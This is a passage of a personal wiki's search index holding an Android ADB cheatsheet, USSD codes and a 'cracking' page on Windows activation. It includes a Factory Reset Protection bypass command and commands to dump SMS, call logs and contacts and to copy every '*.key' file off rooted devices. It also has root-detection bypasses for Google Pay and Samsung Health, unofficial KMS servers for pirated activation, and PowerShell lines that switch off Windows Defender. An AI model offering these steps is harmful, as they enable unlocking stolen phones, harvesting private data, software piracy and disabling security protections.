6"},{"location":"android/adb/readme/#slot-2","text":"Some devices has 2 sim card slot, for print the second simcards imei use below: Print IMEI - Slot 2 service call iphonesubinfo 3 i32 2 | grep -oE '[0-9a-f]{8} ' | while read hex; do echo -ne \"\\u${hex:4:4}\\u${hex:0:4}\"; done; echo","title":"Slot 2"},{"location":"android/adb/readme/#adb-settings","text":"","title":"ADB settings"},{"location":"android/adb/readme/#list-how-many-times-we-booted-device","text":"settings list global|grep \"boot_count=\"|cut -d= -f2|head -n 1|xargs echo \"Booted:\"|sed 's/$/ times/g'","title":"List how many times we booted device:"},{"location":"android/adb/readme/#hide-status-bar","text":"settings put global policy_control immersive.status=*","title":"Hide Status bar"},{"location":"android/adb/readme/#hide-navigation-bar","text":"settings put global policy_control immersive.navigation=*","title":"Hide Navigation bar"},{"location":"android/adb/readme/#hide-both-status-and-navigation-bars","text":"settings put global policy_control immersive.full=*","title":"Hide both status and navigation bars"},{"location":"android/adb/readme/#revert-bars-to-stock-configuration","text":"settings put global policy_control null*","title":"Revert bars to stock configuration"},{"location":"android/adb/readme/#it-is-also-possible-to-specify-this-behavior-for-a-specific-application","text":"","title":"It is also possible to specify this behavior for a specific application."},{"location":"android/adb/readme/#examples-to-modify-the-behavior-when-enterprise-browser-is-in-the-foreground","text":"settings put global policy_control immersive.full=com.honeywell.enterprisebrowser settings put global policy_control immersive.navigation=com.honeywell.enterprisebrowser settings put global policy_control immersive.status=com.honeywell.enterprisebrowser","title":"Examples to modify the behavior when Enterprise Browser is in the foreground:"},{"location":"android/adb/readme/#adb-content","text":"","title":"ADB content"},{"location":"android/adb/readme/#trick-device-that-setup-already-has-been-done-frp-bypassing","text":"content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1 am start -n com.google.android.gsf.login/ am start -n com.google.android.gsf.login.LoginActivity","title":"Trick device that setup already has been done (FRP Bypassing)"},{"location":"android/adb/readme/#globalsettingssecure","text":"content query --uri content://settings/global content query --uri content://settings/settings content query --uri content://settings/seure","title":"Global/Settings/Secure"},{"location":"android/adb/readme/#print-files-for-all-applications","text":"content query --uri content://media/external/file --projection _data","title":"Print files for all applications"},{"location":"android/adb/readme/#select-name-and-value-columns-from-secure-settings-where-name-is-equal-to-new_setting-and-sort-the-result-by-name-in-ascending-order","text":"content query --uri content://settings/secure --projection name:value","title":"Select \"name\" and \"value\" columns from secure settings where \"name\" is equal to \"new_setting\" and sort the result by name in ascending order"},{"location":"android/adb/readme/#remove-new_setting-secure-setting","text":"content delete --uri content://settings/secure --where \"name='new_setting'\"","title":"Remove \"new_setting\" secure setting."},{"location":"android/adb/readme/#download-current-ringtone-and-play-on-pc-via-ffplay","text":"adb shell 'content read --uri content://settings/system/ringtone_cache' > a.ogg|xargs ffplay a.ogg","title":"Download current ringtone and play on PC via ffplay:"},{"location":"android/adb/readme/#various-ways-to-print-contacts","text":"content query --uri content://contacts/phones/ --projection display_name:number:notes content query --uri content://com.android.contacts/data --projection display_name:data1:data4:contact_id content query --uri content://contacts/people/","title":"Various ways to print contacts"},{"location":"android/adb/readme/#print-contacts-phone-numbers","text":"content query --uri content://contacts/phones/","title":"Print Contacts Phone Numbers:"},{"location":"android/adb/readme/#print-contacts-added-in-groups","text":"content query --uri content://contacts/groups/","title":"Print Contacts Added In Groups:"},{"location":"android/adb/readme/#print-group-mmembership","text":"content query --uri content://contacts/groupmembership/","title":"Print Group Mmembership:"},{"location":"android/adb/readme/#print-organiztations","text":"content query --uri content://contacts/organizations/","title":"Print organiztations:"},{"location":"android/adb/readme/#print-call-logs","text":"content query --uri content://call_log/calls","title":"Print Call Logs"},{"location":"android/adb/readme/#print-text-from-sms-sections","text":"content query --uri content://sms/conversations content query --uri content://sms/conversations content query --uri content://sms/draft content query --uri content://sms/inbox content query --uri content://sms/outbox content query --uri content://sms/sent","title":"Print text from SMS sections"},{"location":"android/adb/readme/#print-text-from-mms-sections","text":"content query --uri content://mms content query --uri content://mms/inbox content query --uri content://mms/outbox content query --uri content://mms/part content query --uri content://mms/sent content query --uri content://mms-sms/conversations content query --uri content://mms-sms/draft content query --uri content://mms-sms/locked content query --uri content://mms-sms/search","title":"Print text from MMS sections"},{"location":"android/adb/readme/#auto-rotation-on","text":"content insert \u2013uri content://settings/system \u2013bind name:s:accelerometer_rotation \u2013bind value:i:1","title":"Auto rotation on"},{"location":"android/adb/readme/#auto-rotation-off","text":"content insert \u2013uri content://settings/system \u2013bind name:s:accelerometer_rotation \u2013bind value:i:0","title":"Auto rotation off"},{"location":"android/adb/readme/#rotate-to-landscape","text":"content insert \u2014uri content://settings/system \u2013bind name:s:user_rotation \u2013bind value:i:1","title":"Rotate to landscape"},{"location":"android/adb/readme/#rotate-portrait","text":"content insert \u2013uri content://settings/system \u2013bind name:s:user_rotation \u2013bind value:i:0","title":"Rotate portrait"},{"location":"android/adb/readme/#adb-input","text":"","title":"ADB input"},{"location":"android/adb/readme/#simulate-a-swipe-down-for-notification-bar","text":"input swipe 0 0 0 300","title":"Simulate a swipe down for notification bar:"},{"location":"android/adb/readme/#swipe-and-unlock-screen","text":"input swipe 300 1000 300 500","title":"Swipe and unlock screen:"},{"location":"android/adb/readme/#adb-wm","text":"","title":"ADB wm"},{"location":"android/adb/readme/#print-screen-resolution","text":"wm size","title":"Print Screen Resolution"},{"location":"android/adb/readme/#set-screen-size","text":"wm size WxH","title":"Set Screen Size"},{"location":"android/adb/readme/#set-overscan","text":"wm overscan 0,0,0,200","title":"Set Overscan:"},{"location":"android/adb/readme/#adb-getprop","text":"It is not so much to describe here, get info via getprop command. Example Usage getprop | grep \"model\\|version.sdk\\|manufacturer\\|hardware\\|platform\\|revision\\|serialno\\|product.name\\|brand\"","title":"ADB getprop"},{"location":"android/adb/readme/#print-cpu-abi","text":"getprop ro.product.cpu.abi","title":"Print CPU abi"},{"location":"android/adb/readme/#get-info-if-oem-unlock-is-allowed","text":"1 = Enabled 0 = Disabled getprop sys.oem_unlock_allowed","title":"Get info if OEM Unlock is Allowed"},{"location":"android/adb/readme/#is-system-boot-completed","text":"getprop sys.boot_completed","title":"Is System boot completed"},{"location":"android/adb/readme/#adb-setprop","text":"","title":"ADB setprop"},{"location":"android/adb/readme/#auto-answer-any-call-after-2-seconds","text":"setprop persist.sys.tel.autoanswer.ms 2000","title":"Auto answer any call after 2 seconds:"},{"location":"android/adb/readme/#turn-off-auto-answer","text":"setprop persist.sys.tel.autoanswer.ms 0","title":"Turn off auto answer:"},{"location":"android/adb/readme/#adb-sys","text":"","title":"ADB /sys"},{"location":"android/adb/readme/#set-screen-brightness","text":"","title":"Set Screen Brightness"},{"location":"android/adb/readme/#set-brightness-off","text":"0 is the same as 1 echo 1 > /sys/class/backlight/panel/brightness","title":"Set Brightness Off"},{"location":"android/adb/readme/#set-to-maximum","text":"echo 48600 > /sys/class/backlight/panel/brightness","title":"Set to maximum"},{"location":"android/adb/readme/#set-to-max-normal","text":"echo 255 > /sys/class/backlight/panel/brightness","title":"Set to max normal"},{"location":"android/adb/readme/#try-vibrator","text":"echo 200 > /sys/class/timed_Example Output/vibrator/enable","title":"Try vibrator"},{"location":"android/adb/readme/#print-usb-mode-charging-only-mtp","text":"cat /sys/devices/soc0/hw_platform'","title":"Print USB Mode (Charging only, MTP)"},{"location":"android/adb/readme/#adb-sm","text":"","title":"ADB sm"},{"location":"android/adb/readme/#adopting-usb-drive","text":"sm set-force-adoptable true","title":"Adopting USB-Drive"},{"location":"android/adb/readme/#adb-keytool","text":"","title":"ADB keytool"},{"location":"android/adb/readme/#genereate-hash-from-keystore---typically-used-in-facebook","text":"keytool -exportcert -alias your_alias -keystore debug.keystore | openssl sha1 -binary | openssl base64","title":"Genereate hash from keystore  -Typically used in Facebook"},{"location":"android/adb/readme/#typically-used-in-google-maps","text":"keytool -list -v -keystore ~/.android/debug.keystore -alias your_alias","title":"Typically used in Google Maps"},{"location":"android/adb/readme/#adb-monkey","text":"","title":"ADB monkey"},{"location":"android/adb/readme/#test-any-app-by-pressing-10000-times-at-once-this-will-start-your-application-and-perform-10000-random-events","text":"monkey -p com.example.myapp -v 10000 Example Output com.google.android.youtube/.app.honeycomb.Shell$HomeActivity com.google.android.googlequicksearchbox/.SearchActivity com.google.android.apps.docs.editors.docs/com.google.android.apps.docs.app.NewMainProxyActivity com.android.documentsui/.LauncherActivity com.google.android.apps.docs.editors.sheets/com.google.android.apps.docs.app.NewMainProxyActivity com.google.android.apps.docs.editors.slides/com.google.android.apps.docs.app.NewMainProxyActivity com.android.vending/.AssetBrowserActivity","title":"Test any app by pressing 10000 times at once, this will start your application and perform 10000 random events.#"},{"location":"android/adb/readme/#adb-sqlite3","text":"","title":"ADB sqlite3"},{"location":"android/adb/readme/#read-sim-card-info","text":"sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select icc_id,card_id,carrier_name,display_name,mcc,mnc from siminfo' Example Output icc_id = 8946209802SSSSSSSSS card_id = 8946209802SSSSSSSSS display_name = CARD mcc = 0 mnc = 0 icc_id = 8946209802SSSSSSSSS card_id = 8946209802SSSSSSSSS carrier_name = Telia display_name = Telia mcc = 240 mnc = 7","title":"Read SIM Card info"},{"location":"android/adb/readme/#read-all-sim-card-info","text":"sqlite3 -line /data/user_de/0/com.android.providers.telephony/databases/telephony.db 'select * from siminfo'","title":"Read All SIM Card Info"},{"location":"android/adb/readme/#print-iccid","text":"sqlite3 /data/vendor/radio/qcril.db 'select ICCID from qcril_manual_prov_table'","title":"Print ICCID"},{"location":"android/adb/readme/#print-data-in-db-files-clean","text":"grep -vx -f <(sqlite3 Main.db .dump) <(sqlite3 ${DB} .schema)","title":"Print data in .db files, clean:"},{"location":"android/adb/readme/#use-below-command-fr-update-dgdb-file","text":"sqlite3 /data/data/com.google.android.gms/databases/dg.db \"update main set c='0' where a like '%attest%';\"","title":"Use below command fr update dg.db file:"},{"location":"android/adb/readme/#grab-all-file-extensions-of-a-kind-and-download-to-pc","text":"for i in ` adb shell \"su -c find /data /system -name '*.key'\" ` ; do mkdir -p \".`dirname $i `\" ; adb shell \"su -c cat $i \" > \". $i \" ; done","title":"Grab all file extensions of a kind and download to PC"},{"location":"android/adb/readme/#print-uptime-for-your-device-by-days--time","text":"TZ = UTC date -d@ $( cut -d \\ -f1 /proc/uptime ) + '%j %T' | awk '{print $1-1\"d\",$2}'","title":"Print uptime for your device by days + time"},{"location":"android/adb/readme/#android-paths","text":"/data/ssh /data/adb/magisk /data/data/<package>/databases (app databases) /data/data/<package>/shared_prefs/ (shared preferences) /data/app (apk installed by user) /system/app (pre-installed APK files) /mmt/asec (encrypted apps) (App2SD) /mmt/emmc (internal SD Card) /mmt/adcard (external/Internal SD Card) /mmt/adcard/external_sd (external SD Card)","title":"Android paths"},{"location":"android/adb/readme/#android-root","text":"Commands for rooted devices","title":"Android root"},{"location":"android/adb/readme/#find-out-if-the-device-is-rooted-and-if-su-exist","text":"which su &> /dev/null;[[ $? = \"0\" ]] && echo \"Rooted\" || echo \"Not rooted\"","title":"Find out if the device is rooted and if su exist"},{"location":"android/adb/readme/#bypass-google-pay-block","text":"","title":"Bypass Google Pay Block"},{"location":"android/adb/readme/#stop-wallnetfcrel","text":"am force-stop /data/data/com.google.android.apps.walletnfcrel Hide root for Google apps: for google_apps in $( cmd package list packages | grep -i com.google | cut -d: -f2 ) ; do magiskhide add ${ google_apps } ; done","title":"Stop wallnetfcrel"},{"location":"android/adb/readme/#change-permissions-on-dgdb-to-read-and-write","text":"su sh -c chmod 0777 /data/data/com.google.android.gms/databases/dg.db","title":"Change permissions on dg.db to read-and-write:"},{"location":"android/adb/readme/#now-change-permissions-on-dgdb-to-0444","text":"chmod 0444 /data/data/com.google.android.gms/databases/dg.db Clear cache for your Google Pay application and have fun! :)","title":"Now change permissions on dg.db to 0444"},{"location":"android/adb/readme/#grab-all-file-extensions-of-a-kind-and-download-to-pc_1","text":"for i in ` adb shell \"su -c find /data /system -name '*.key'\" ` ; do mkdir -p \".`dirname $i `\" ; adb shell \"su -c cat $i \" > \". $i \" ; done","title":"Grab all file extensions of a kind and download to PC"},{"location":"android/adb/readme/#android-wusemans-notices","text":"Find out happens when we remove below file rm /data/misc/bootstat/boot_complete?","title":"Android wuseman's notices"},{"location":"android/adb/readme/#android-magisk-updated-version---zygisk---comming-soon","text":"..... will be added very soon.","title":"Android magisk (updated version - zygisk - comming soon)"},{"location":"android/adb/readme/#android-magisk-older-versions","text":"","title":"Android magisk (older versions)"},{"location":"android/adb/readme/#enable-magiskhide","text":"/sbin/magisk magiskhide enable","title":"Enable magiskhide"},{"location":"android/adb/readme/#list-hided-apps-by-magisk","text":"/sbin/magisk magiskhide list","title":"List hided apps by magisk"},{"location":"android/adb/readme/#add-package-to-magiskhide","text":"/sbin/magisk magiskhide add com.package","title":"Add package to magiskhide"},{"location":"android/adb/readme/#adb-commands-sorted-by-brand","text":"","title":"ADB commands sorted by brand"},{"location":"android/adb/readme/#samsung","text":"","title":"Samsung"},{"location":"android/adb/readme/#bypass-samsung-health-block-on-rooted-samsung-devices","text":"mount -o rw,remount /system/etc/mkshrc sed -i 's/ro.config.tima=1/ro.config.tima=0/g' build.prop","title":"Bypass Samsung Health block on rooted samsung devices"},{"location":"android/adb/readme/#adb-screencap","text":"screencap /storage/emulated/0/Pictures/screenshot.png","title":"ADB screencap"},{"location":"android/adb/readme/#adb-screenrecord","text":"screenrecord --time-limit 10 /storage/emulated/0/Video/record.mp4","title":"ADB screenrecord"},{"location":"android/adb/readme/#android-frp-bypass","text":"wuseman - Samsung Galaxy A10 wuseman - Samsung Galaxy A10 wuseman - Samsung Galaxy A5 wuseman - Samsung Galaxy S10 wuseman - Samsung Galaxy S8 wuseman - Samsung Galaxy Xcover 4 wuseman - Motorola Moto E4 Plus wuseman - Huawei MediaTab T5 wuseman - LG G6","title":"Android FRP Bypass"},{"location":"android/adb/readme/#similiar-websites","text":"","title":"Similiar websites"},{"location":"android/adb/readme/#gentoo-wiki","text":"Gentoo Wiki - ADB ( Maintained by wuseman )","title":"Gentoo Wiki"},{"location":"android/adb/readme/#nr1--wuseman","text":"Nr1 - Your journey to master Android\u2122 Shell begins here wuseman - ADB Cheatsheet Stackoverflow - Bluetooth","title":"Nr1 / wuseman"},{"location":"android/adb/readme/#adb-shell","text":"* ADB Shell - Just Another ADB Cheatsheet wiki","title":"ADB Shell"},{"location":"android/adb/readme/#android","text":"Android\u2122 Developer - Emulator Console Android\u2122 Developer - Write your app Android\u2122 Google Source - Source Code Android\u2122 Google Source - CMD Command Android\u2122 Generic Project Android\u2122 GDB Android\u2122 Source - Understand Logging Android\u2122 Source - Network Connectivity Tests Android\u2122 Platform Tools","title":"Android"},{"location":"android/adb/readme/#github","text":"Github Randorise - Mobile Hacking CheatSheet","title":"Github"},{"location":"android/adb/readme/#mazhuang","text":"Mazhuang - Awesome ADB - Another Cheatsheet Wiki","title":"Mazhuang"},{"location":"android/adb/readme/#jfsso","text":"Jfsso - Preferences Editor","title":"Jfsso"},{"location":"android/adb/readme/#nahamsec","text":"Nahamsec - Resources For Beginner - Bug Bounty Hunters","title":"Nahamsec"},{"location":"android/adb/readme/#raywenderlich","text":"Raywenderlich -Forensic Artifacts","title":"Raywenderlich"},{"location":"android/adb/readme/#noobsec","text":"Noobsec - Bypass Fingerprint Lock In Just 1 Second Noobsec - Cara Reverse Engineering","title":"Noobsec"},{"location":"android/adb/readme/#oracle","text":"Oracle- JVMS","title":"Oracle"},{"location":"android/adb/readme/#tjtech","text":"Tjtech - Analyze OEM Unlocking Under Android","title":"Tjtech"},{"location":"android/adb/readme/#usmile","text":"U'Smile - How to change the IMEI on Android devices","title":"U'Smile"},{"location":"android/adb/readme/#xda-developers","text":"Android\u2122 Q Navigation - Gesture Controls","title":"XDA Developers"},{"location":"android/adb/readme/#get-in-touch","text":"Want your website listed here and you think you have something to contribute? Send me an email or contact me on \u00cdRC: iRC : wuseman@ Libera Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Mail : wuseman@ nr1.nu","title":"Get in Touch"},{"location":"android/adb/readme/#wiki-author","text":"wuseman < wuseman@nr1.nu > *","title":"Wiki author"},{"location":"android/adb/readme/#wiki-license","text":"Android Nr1 nu wiki is licensed under the GNU General Public License v3.0 - See the LICENSE.md file for details Happy Hacking!","title":"Wiki License"},{"location":"android/adb/uusd_codes/","text":"-------------------------------------------------------------------------------------------------------------------------------- # UUSD CODES -------------------------------------------------------------------------------------------------------------------------------- *#06# ## Displays IMEI number *#*#225#*#* ## Calendar Info *#*#426#*#* ## Google Play Services *#*#1357946#*#* ## EMUI version, Serial Number and Product ID *#*#2846579#*#* ## Background Settings, Veneer information, Network Information Query, Software Upgrade, Restore Factory, Battery Charge *#*#2846#*#* ## MMI Audio Simple test *#2846# ## MMI Manu Normal test *#*#1472365#*#* ## Quick GPS Test *#*#1575#*#* ## A Different Type GPS Test *#*#0*#*#* ## Android Device LCD display test *#*#0842#*#* ## Vibration and Backlight test *#*#2664#*#* ## Android Device Touch-Screen test *#*#0588#*#* ## Proximity sensor test *#*#7262626#*#* ## Device Field test *#*#232339#*#* ## Device Wireless Lan Test *#*#526#*#* ## Device Wireless Lan Test *#*#0289#*#* ## Device Audio test *#*#0673#*#* ## Device Audio test *#*#232331#*#* ## Device Bluetooth test *#*#0283#*#* ## Packet Loopback test *#*#34971539#*#* ## Shows complete information about the Device camera *#*#2663#*#* ## The displays touch-screen version of Android device *#*#3264#*#* ## Android Device Ram version*#06# Displays IMEI number *#*#232337#*# ## Displays Bluetooth device address *#*#232338#*#* ## Displays Wi-Fi Mac-address *#*#1234#*#* ## PDA and Device firmware info *#*#1111#*#* ## FTA Software version *#*#2222#*#* ## FTA Hardware version *#*#44336#*#* ## Displays Build time and change list number *#*#7780#*#* ## Reset Android device. Erase all your device data like photos, apps, and settings etc. *2767*3855# ## It will also Format all your device data and reinstall Android Device firmware. *#*#273283*255*663282*#*#* ## For a quick backup to all your media files *#*#7594#*#* ## Changing the power button behavior \u2013 Enables direct power off once you try this code *#*#8255#*#* ## For Google Talk service monitoring *#*#8351#*#* ## Enables voice dialing logging mode *#*#8350#*#* ## Disables voice dialing logging mode # #778 (+call) ## Brings up Epst menu *#*#197328640#*#* ## Enabling test mode for service activity *#*#4986*2650468#*#* ## PDA, Phone, Hardware, RF Call Date firmware information *#*#64663#*#* ## QC test *#*#759#*#* ## Rlz Debug Ul","title":"uusd-codes"},{"location":"cracking/","text":"info cracking related stuff will be found here","title":"info"},{"location":"cracking/#info","text":"cracking related stuff will be found here","title":"info"},{"location":"cracking/wloader/","text":"WLOADER Windows 10 PRO Activator without using any backdoor loader from China and neither you will need any crack anymore that is valid for a week or two. This is script is written for cmd. This script will also removing all bloatware from Windows 10. Edit script after your needs. To display more detailed license information\u2013including the activation ID, installation ID, and other details\u2013run the following command: slmgr.vbs /dlv Activate Windows 10 Enterprise 10.0.19043 N/A Build 19043, full example: slmgr.vbs /ipk DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 slmgr /skms kms8.msguides.com slmgr.vbs /ato View the License Expiration Date slmgr.vbs /xpr Remove Activation Key: slmgr.vbs /upk Uninstall Product Key slmgr.vbs /cpky Set new key: slmgr.vbs /ipk #####-#####-#####-#####-##### Configure slmgr via remote slmgr.vbs computername username password /option Keys Home: TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 Home N: 3KHY7-WNT83-DGQKR-F7HPR-844BM Professional: W269N-WFGWX-YVC9B-4J6C9-T83GX Professional N: MH37W-N47XK-V7XM9-C7227-GCQG9 Education: NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 Education N: 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ Enterprise: NPPR9-FWDCX-D2C8J-H872K-2YT43 Enterprise N: DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 Enterprise LSTB: WNMTR-4C88C-JK8YV-HQ7T2-76DF9 Enterprise LSTB N: 2F77B-TNFGY-69QQF-B8YKP-D69TJ KMS Servers: Add keys via: slmgr /skms <server> kms.digiboy.ir kms.cangshui.net hq1.chinancce.com 54.223.212.31 kms.cnlic.com kms.chinancce.com kms.ddns.net franklv.ddns.net k.zpale.com m.zpale.com mvg.zpale.com kms.shuax.com kensol263.imwork.net:1688 xykz.f3322.org kms789.com dimanyakms.sytes.net:1688 kms.03k.org:1688 SLMGR Commands slmgr.exe -ato Activate Windows license and product key against Microsoft\u2019s server. slmgr.exe -atp Confirmation_ID Activate Windows with user-provided Confirmation ID. slmgr.exe -ckms Clear the name of KMS server used to default and port to default. slmgr.exe -cpky Clear product key from the registry (prevents disclosure attacks). slmgr.exe -dli Display the current license information with activation status and partial product key. slmgr.exe -dlv Verbose, similar to -dli but with more information. slmgr.exe -dti Display Installation ID for offline activation. slmgr.exe -ipk Key Enter a new product key supplied as xxxxx-xxxxx-xxxxx-xxxxx-xxxxx. slmgr.exe -ilc License_file Install license. slmgr.exe -rilc Re-install system license files. slmgr.exe -rearm Reset the evaluation period/licensing status and activation state of the machine. slmgr.exe -skms activationservername:port Set the Volume Licensing KMS server and/or the port used for KMS activation (where supported by your Windows edition). slmgr.exe -skhc Enable KMS host caching (default), this blocks the use of DNS priority and weight after the initial discovery of a working KMS host. slmgr.exe -ckhc Disable KMS host caching. This setting instructs the client to use DNS auto-discovery each time it attempts KMS activation slmgr.exe -sai interval Sets the interval in minutes for unactivated clients to attempt KMS connection. The activation interval must be between 15 - 30 days slmgr.exe -sri interval Sets the renewal interval in minutes for activated clients to attempt KMS connection. The renewal interval must be between slmgr.exe -spri Set the KMS priority to normal (default) slmgr.exe -cpri Set the KMS priority to low. slmgr.exe -sprt port Sets the port on which the KMS host listens for client activation requests. The default TCP port is 1688. slmgr.exe -sdns Enable DNS publishing by the KMS host (default). slmgr.exe -cdns Disable DNS publishing by the KMS host. slmgr.exe -upk Uninstall current installed product key and return license status back to trial state. slmgr.exe -xpr Show the expiry date of current license (if not permanently activated). Token-based activation: slmgr.exe -lil List the installed token-based activation issuance licenses. slmgr.exe -ril ILID ILvID Remove an installed token-based activation issuance license. slmgr.exe -stao Set the Token-based Activation Only flag, disabling automatic KMS activation. slmgr.exe -ctao Clear the Token-based Activation Only flag (default), enabling automatic KMS activation. slmgr.exe -ltc List valid token-based activation certificates that can activate installed software slmgr.exe -fta Certificate Thumbprint Force token-based activation using the identified certificate. Disable RealTime PRotection / Windows Defenders / Windows AutoScans Get-MpPreference Set-MpPreference -DisableArchiveScanning $true Set-MpPreference -DisableAutoExclusions $true Set-MpPreference -DisableBehaviorMonitoring $true Set-MpPreference -DisableBlockAtFirstSeen $true Set-MpPreference -DisableRealtimeMonitoring $true Set-MpPreference -DisableScanningNetworkFiles $true Set-MpPreference -DisableScriptScanning $true Set-MpPreference -DisableArchiveScanning $true Set-MpPreference -ScanParameters 0 Install WSL2 ( Gentoo ) Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName Microsoft-Windows-Subsystem-Linux Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName VirtualMachinePlatform wsl --set-default-version 2 wsl --import gentoo C:\\Users\\salfter\\gentoo\\ C:\\Users\\salfter\\Downloads\\stage3-amd64-nomultilib-20200624T214505Z.tar --version 2 RESOURCES https://www.reneelab.com/win10-activation-crack-free.html https://docs.microsoft.com/sv-se/windows-server/get-started/kmsclientkeys CONTACT If you have problems, questions, ideas or suggestions please contact us by posting to wuseman@nr1.nu WEB SITE Visit our homepage for the latest info and updated tools @wuseman END!","title":"wloader"},{"location":"cracking/wloader/#wloader","text":"Windows 10 PRO Activator without using any backdoor loader from China and neither you will need any crack anymore that is valid for a week or two. This is script is written for cmd. This script will also removing all bloatware from Windows 10. Edit script after your needs. To display more detailed license information\u2013including the activation ID, installation ID, and other details\u2013run the following command: slmgr.vbs /dlv","title":"WLOADER"},{"location":"cracking/wloader/#activate-windows-10-enterprise-10019043-na-build-19043-full-example","text":"slmgr.vbs /ipk DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 slmgr /skms kms8.msguides.com slmgr.vbs /ato","title":"Activate Windows 10 Enterprise 10.0.19043 N/A Build 19043, full example:"},{"location":"cracking/wloader/#view-the-license-expiration-date","text":"slmgr.vbs /xpr","title":"View the License Expiration Date"},{"location":"cracking/wloader/#remove-activation-key","text":"slmgr.vbs /upk","title":"Remove Activation Key:"},{"location":"cracking/wloader/#uninstall-product-key","text":"slmgr.vbs /cpky","title":"Uninstall Product Key"},{"location":"cracking/wloader/#set-new-key","text":"slmgr.vbs /ipk #####-#####-#####-#####-#####","title":"Set new key:"},{"location":"cracking/wloader/#configure-slmgr-via-remote","text":"slmgr.vbs computername username password /option","title":"Configure slmgr via remote"},{"location":"cracking/wloader/#keys","text":"Home: TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 Home N: 3KHY7-WNT83-DGQKR-F7HPR-844BM Professional: W269N-WFGWX-YVC9B-4J6C9-T83GX Professional N: MH37W-N47XK-V7XM9-C7227-GCQG9 Education: NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 Education N: 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ Enterprise: NPPR9-FWDCX-D2C8J-H872K-2YT43 Enterprise N: DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 Enterprise LSTB: WNMTR-4C88C-JK8YV-HQ7T2-76DF9 Enterprise LSTB N: 2F77B-TNFGY-69QQF-B8YKP-D69TJ","title":"Keys"},{"location":"cracking/wloader/#kms-servers","text":"Add keys via: slmgr /skms <server> kms.digiboy.ir kms.cangshui.net hq1.chinancce.com 54.223.212.31 kms.cnlic.com kms.chinancce.com kms.ddns.net franklv.ddns.net k.zpale.com m.zpale.com mvg.zpale.com kms.shuax.com kensol263.imwork.net:1688 xykz.f3322.org kms789.com dimanyakms.sytes.net:1688 kms.03k.org:1688","title":"KMS Servers:"},{"location":"cracking/wloader/#slmgr-commands","text":"slmgr.exe -ato Activate Windows license and product key against Microsoft\u2019s server. slmgr.exe -atp Confirmation_ID Activate Windows with user-provided Confirmation ID. slmgr.exe -ckms Clear the name of KMS server used to default and port to default. slmgr.exe -cpky Clear product key from the registry (prevents disclosure attacks). slmgr.exe -dli Display the current license information with activation status and partial product key. slmgr.exe -dlv Verbose, similar to -dli but with more information. slmgr.exe -dti Display Installation ID for offline activation. slmgr.exe -ipk Key Enter a new product key supplied as xxxxx-xxxxx-xxxxx-xxxxx-xxxxx. slmgr.exe -ilc License_file Install license. slmgr.exe -rilc Re-install system license files. slmgr.exe -rearm Reset the evaluation period/licensing status and activation state of the machine. slmgr.exe -skms activationservername:port Set the Volume Licensing KMS server and/or the port used for KMS activation (where supported by your Windows edition). slmgr.exe -skhc Enable KMS host caching (default), this blocks the use of DNS priority and weight after the initial discovery of a working KMS host. slmgr.exe -ckhc Disable KMS host caching. This setting instructs the client to use DNS auto-discovery each time it attempts KMS activation slmgr.exe -sai interval Sets the interval in minutes for unactivated clients to attempt KMS connection. The activation interval must be between 15 - 30 days slmgr.exe -sri interval Sets the renewal interval in minutes for activated clients to attempt KMS connection. The renewal interval must be between slmgr.exe -spri Set the KMS priority to normal (default) slmgr.exe -cpri Set the KMS priority to low. slmgr.exe -sprt port Sets the port on which the KMS host listens for client activation requests. The default TCP port is 1688. slmgr.exe -sdns Enable DNS publishing by the KMS host (default). slmgr.exe -cdns Disable DNS publishing by the KMS host. slmgr.exe -upk Uninstall current installed product key and return license status back to trial state. slmgr.exe -xpr Show the expiry date of current license (if not permanently activated). Token-based activation: slmgr.exe -lil List the installed token-based activation issuance licenses. slmgr.exe -ril ILID ILvID Remove an installed token-based activation issuance license. slmgr.exe -stao Set the Token-based Activation Only flag, disabling automatic KMS activation. slmgr.exe -ctao Clear the Token-based Activation Only flag (default), enabling automatic KMS activation. slmgr.exe -ltc List valid token-based activation certificates that can activate installed software slmgr.exe -fta Certificate Thumbprint Force token-based activation using the identified certificate.","title":"SLMGR Commands"},{"location":"cracking/wloader/#disable-realtime-protection--windows-defenders--windows-autoscans","text":"Get-MpPreference Set-MpPreference -DisableArchiveScanning $true Set-MpPreference -DisableAutoExclusions $true Set-MpPreference -DisableBehaviorMonitoring $true Set-MpPreference -DisableBlockAtFirstSeen $true Set-MpPreference -DisableRealtimeMonitoring $true Set-MpPreference -DisableScanningNetworkFiles $true Set-MpPreference -DisableScriptScanning $true Set-MpPreference -DisableArchiveScanning $true Set-MpPreference -ScanParameters 0","title":"Disable RealTime PRotection / Windows Defenders / Windows AutoScans"},{"location":"cracking/wloader/#install-wsl2--gentoo-","text":"Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName Microsoft-Windows-Subsystem-Linux Enable-WindowsOptionalFeature -NoRestart -Online -FeatureName VirtualMachinePlatform wsl --set-default-version 2 wsl --import gentoo C:\\Users\\salfter\\gentoo\\ C:\\Users\\salfter\\Downloads\\stage3-amd64-nomultilib-20200624T214505Z.tar --version 2","title":"Install WSL2 ( Gentoo )"},{"location":"cracking/wloader/#resources","text":"https://www.reneelab.com/win10-activation-crack-free.html https://docs.microsoft.com/sv-se/windows-server/get-started/kmsclientkeys","title":"RESOURCES"},{"location":"cracking/wloader/#contact","text":"If you have problems, questions, ideas or suggestions please contact us by posting to wuseman@nr1.nu","title":"CONTACT"},{"location":"cracking/wloader/#web-site","text":"Visit our homepage for the latest info and updated tools @wuseman","title":"WEB SITE"},{"location":"cracking/wloader/#end","text":"","title":"END!"},{"location":"gentoo/gentoo-chroot/","text":"gentoo-chroot Important Remember that if you subsequently use the target machine directly at its keyboard (rather than through the ssh/screen combination as here), you'll be working outside of the chroot, and all your paths will be incorrect (e.g. the new system will still appear at /mnt/gentoo/). It's an easy mistake to make, hence the renaming of the prompts. Once the kernel is built and the machine rebooted, we'll be 'natively' 